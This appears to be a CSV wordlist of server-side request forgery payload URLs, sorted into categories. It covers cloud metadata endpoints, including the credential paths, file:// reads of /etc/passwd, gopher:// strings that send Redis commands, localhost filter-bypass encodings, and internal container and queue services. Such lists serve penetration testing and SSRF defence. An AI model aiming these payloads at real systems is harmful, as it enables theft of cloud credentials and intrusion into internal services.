URL,Category,Notes
dict://dict-server:2628/,Alternative Protocols & Schemes,
dict://redis:6379/,Database Services,"Redis - text-based protocol, useful with gopher://"
file:///etc/hostname,Alternative Protocols & Schemes,File protocol - for local file access
file:///etc/hosts,Alternative Protocols & Schemes,File protocol - for local file access
file:///etc/passwd,Alternative Protocols & Schemes,File protocol - for local file access
file:///proc/version,Alternative Protocols & Schemes,File protocol - for local file access
file:///windows/system32/drivers/etc/hosts,Alternative Protocols & Schemes,File protocol - for local file access
file://localhost/etc/passwd,Alternative Protocols & Schemes,File protocol - for local file access
ftp://ftp-server:21/,Alternative Protocols & Schemes,
ftp://internal-ftp:21/,Alternative Protocols & Schemes,
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a,Alternative Protocols & Schemes,Gopher protocol - useful for raw TCP communication
gopher://redis:6379/,Database Services,"Redis - text-based protocol, useful with gopher://"
gopher://redis:6379/_*1%0d%0a$4%0d%0aeval%0d%0a,Alternative Protocols & Schemes,"Redis - text-based protocol, useful with gopher://"
http://0.0.0.0:8080/,Localhost Variations & Bypass Techniques,
http://0/,Localhost Variations & Bypass Techniques,
http://017700000001/,Localhost Variations & Bypass Techniques,
http://0x7f000001/,Localhost Variations & Bypass Techniques,
http://10.96.0.1:443/,Container & Orchestration Services,
http://100.100.100.200/latest/meta-data/,Cloud Metadata Services,
http://127.0.0.1#@evil.com/,Localhost Variations & Bypass Techniques,
http://127.0.0.1.nip.io/,Localhost Variations & Bypass Techniques,DNS service that resolves to embedded IP addresses
http://127.0.0.1:8080/,Localhost Variations & Bypass Techniques,
http://127.0.1/,Localhost Variations & Bypass Techniques,
http://127.1.1.1:[email protected]:80/,Localhost Variations & Bypass Techniques,
http://127.1/,Localhost Variations & Bypass Techniques,
http://168.63.129.16:80/,Cloud Metadata Services,
http://169.254.169.254/computeMetadata/v1/,Cloud Metadata Services,Cloud metadata service - requires proper headers for some providers
http://169.254.169.254/latest/dynamic/instance-identity/document,Cloud Metadata Services,Cloud metadata service - requires proper headers for some providers
http://169.254.169.254/latest/meta-data/,Cloud Metadata Services,Cloud metadata service - requires proper headers for some providers
http://169.254.169.254/latest/meta-data/iam/security-credentials/,Cloud Metadata Services,Cloud metadata service - requires proper headers for some providers
http://169.254.169.254/latest/user-data/,Cloud Metadata Services,Cloud metadata service - requires proper headers for some providers
http://169.254.169.254/metadata/instance?api-version=2017-04-02,Cloud Metadata Services,Cloud metadata service - requires proper headers for some providers
http://169.254.169.254/metadata/v1/,Cloud Metadata Services,Cloud metadata service - requires proper headers for some providers
http://169.254.169.254/metadata/v1/maintenance,Cloud Metadata Services,Cloud metadata service - requires proper headers for some providers
http://169.254.169.254/opc/v1/,Cloud Metadata Services,Cloud metadata service - requires proper headers for some providers
http://169.254.169.254/opc/v2/,Cloud Metadata Services,Cloud metadata service - requires proper headers for some providers
http://192.168.65.7:2375/,Container & Orchestration Services,
http://2130706433.nip.io/,Localhost Variations & Bypass Techniques,DNS service that resolves to embedded IP addresses
http://2130706433/,Localhost Variations & Bypass Techniques,
http://7f000001.nip.io/,Localhost Variations & Bypass Techniques,DNS service that resolves to embedded IP addresses
http://[0:0:0:0:0:ffff:127.0.0.1]/,Localhost Variations & Bypass Techniques,
http://[::1]/,Localhost Variations & Bypass Techniques,
http://[::]/,Localhost Variations & Bypass Techniques,
http://[::ffff:127.0.0.1]/,Localhost Variations & Bypass Techniques,
http://activemq:61616/,Message Queues & Event Systems,
http://activemq:8161/,Message Queues & Event Systems,
